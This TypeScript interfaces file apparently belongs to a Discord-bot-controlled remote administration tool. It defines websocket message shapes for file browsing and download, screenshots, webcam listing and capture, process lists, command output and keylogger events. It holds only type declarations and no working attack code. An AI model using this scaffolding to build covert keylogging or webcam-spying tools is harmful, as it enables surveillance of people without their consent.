import { type Base64String } from "discord.js";
import { type Process, type DirEntry } from "./ws.types";

export interface GetFilesFolder {
	controllerid: string;
	files: DirEntry[];
	folder: string;
	relativepath: string;
}

export interface WsConnection {
	controllerid: string;
	clientid: string;
	alias: string;
	messageid: string;
}

export interface WsScreenshot {
	controllerid: string;
	screenshot: ArrayBuffer;
}

export interface WsScreensToBot {
	controllerid: string;
	messageid: string;
	screens: Array<{
		id: number;
		resolution: [number, number];
		frequency: number;
		isprimary: boolean;
	}>;
}

export interface WsDownloadFile {
	controllerid: string;
	file: string;
	fileMetadata: {
		filename: string;
		size: number;
		format: string;
	};
}

export interface WsTasksFromClient {
	controllerid: string;
	tasks: Process[];
}

export interface GetCmdCommand {
	controllerid: string;
	output: string;
	path: string;
}

export interface MessageEvent {
	title: string;
	controllerid: string;
	message: string;
}

export interface KeyLoggerEvent {
	keys: string[];

	controllerid: string;
}

export interface AddFriendEvent {
	accept: boolean;
	controllerid: string;
	clientid: string;
}

export interface GetWebcamsEvent {
	messageid: string

	controllerid: string;
	webcams: Array<{
		id: string;
		name: string;
	}>;
}

export interface GetWebcamScreenshotEvent {
	controllerid: string;
	screenshot: Base64String;
}